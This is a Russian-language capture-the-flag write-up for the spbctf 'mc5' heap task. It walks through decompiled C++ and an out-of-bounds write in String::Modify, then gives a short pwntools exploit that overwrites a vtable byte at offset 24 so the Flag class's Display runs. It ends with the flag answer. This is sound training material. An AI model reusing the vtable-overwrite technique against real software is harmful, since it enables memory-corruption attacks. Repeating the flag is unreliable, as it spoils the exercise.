[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn7_mc5)
Описание:
Having some VPtr C++ Fun. Ctions.
`nc 109.233.56.90 11715`
**[mc5.elf](https://pwn.spbctf.ru/files/heap/mc5/mc5.elf)**

Программа имеет функционал добавления, удаления и модификации объектов.
``` C++
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // r12d
  __int64 v4; // rax
  __int64 v5; // rax
  int v6; // ebx
  std::string choice; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v9; // [rsp+28h] [rbp-18h]

  v9 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 0);
  std::operator<<<std::char_traits<char>>(&std::cout, "Hello-hello!\n");
  std::operator<<<std::char_traits<char>>(&std::cout, "Welcome to the C++ Fun House\n");
  std::operator<<<std::char_traits<char>>(&std::cout, "Be sure to check out the Flag class!\n");
  do
  {
    std::string::basic_string(&choice);
    std::operator<<<std::char_traits<char>>(&std::cout, "\nMENU:\n");
    v4 = std::operator<<<std::char_traits<char>>(&std::cout, "  (current count: ");
    v5 = std::ostream::operator<<(v4, COUNT);
    std::operator<<<std::char_traits<char>>(v5, ")\n");
    std::operator<<<std::char_traits<char>>(&std::cout, "i - add int\n");
    std::operator<<<std::char_traits<char>>(&std::cout, "s - add string\n");
    std::operator<<<std::char_traits<char>>(&std::cout, "d - display element\n");
    std::operator<<<std::char_traits<char>>(&std::cout, "m - modify element\n");
    std::operator<<<std::char_traits<char>>(&std::cout, "r - remove element\n");
    std::operator<<<std::char_traits<char>>(&std::cout, "choice: ");

    alarm(0x78u);
    std::operator>><char>(&std::cin, &choice);
    if ( std::operator==<char>(&choice, &_rhs) )
    {
      v3 = 0;
      v6 = 0;
    }
    else
    {
      if ( std::operator==<char>(&choice, aIsdmr) )
      {
        add_int();
      }
      else if ( std::operator==<char>(&choice, &aIsdmr[2]) )
      {
        add_string();
      }
      else if ( std::operator==<char>(&choice, &aIsdmr[4]) )
      {
        display_element();
      }
      else if ( std::operator==<char>(&choice, &aIsdmr[6]) )
      {
        modify_element();
      }
      else if ( std::operator==<char>(&choice, &aIsdmr[8]) )
      {
        remove_element();
      }
      v6 = 1;
    }
    std::string::~string(&choice);
  }
  while ( v6 == 1 );
  return v3;
}
```

Классы Flag, String и Int наследуются от класса Data и имеют таблицу из двух виртуальных адресов: Display, Modify.
![{E828CCEE-E8D4-42F1-95C8-D6765762BE13}](../../../../z.%20Images/{E828CCEE-E8D4-42F1-95C8-D6765762BE13}.png)

Для String и Int метод Display просто печатает их значение в консоль. А флаг имеет такую реализацию:
``` c++
void __cdecl Flag::Display(Flag *const this)
{
  std::operator<<<std::char_traits<char>>(&std::cout, "The flag is:\n");
  system("cat flag.txt");
}
```
Значит необходимо вызвать этот метод, чтобы получить флаг.

Уязвимость лежит в методе модификации String, здесь нет проверки на выход за пределы массива:
``` c++
void __cdecl String::Modify(String *const this)
{
  __int64 v1; // rax
  __int64 v2; // rax
  char *v3; // rax
  char c; // [rsp+1Bh] [rbp-5h] BYREF
  int idx; // [rsp+1Ch] [rbp-4h] BYREF

  std::operator<<<std::char_traits<char>>(&std::cout, "Char position to modify: ");
  std::istream::operator>>(&std::cin, &idx);
  v1 = std::operator<<<std::char_traits<char>>(&std::cout, "New char at ");
  v2 = std::ostream::operator<<(v1, idx);
  std::operator<<<std::char_traits<char>>(v2, ": ");
  std::operator>><char,std::char_traits<char>>(&std::cin, &c);
  v3 = std::string::operator[](&this->data, idx);
  *v3 = c;
}
```
Чтобы получить флаг необходимо подменить таблицу виртуальных адресов в любом объекте на Flag через WWW в методе String::Modify.


Под qira можно удобно рассчитать офсеты, чтобы не считать их руками:
1. Создать объект строки.
2. Создать любой другой объект (например числа).
3. Рассчитать офсет.
![{9B420172-2BDB-408B-8145-9166778D01FD}](../../../../z.%20Images/{9B420172-2BDB-408B-8145-9166778D01FD}.png)
Красным цветом выделен индекс начала строки.

Перезаписать надо вот этот адрес:
![{5A5EEEE3-55A2-4EFB-ACA0-7BEA0999402B}](../../../../z.%20Images/{5A5EEEE3-55A2-4EFB-ACA0-7BEA0999402B}.png)
Байт 70 надо поменять на 30. Смещение = 24.

Эксплоит:
``` python
io = start()

io.sendline(b's qweqwe')    # создать строку
io.sendline(b'i 0')         # создать число

io.sendline(b'm 0 24 \x30') # поменять байт 70 на 30
io.sendline(b'd 1')         # показать число

io.interactive()
```

Запуск:
![{66B9D778-F8E2-44EB-BC2B-6DEBF1BA0BF5}](../../../../z.%20Images/{66B9D778-F8E2-44EB-BC2B-6DEBF1BA0BF5}.png)

Ответ: `spbctf{7086ed282d834f7f6c1fdc1e1f69604c}`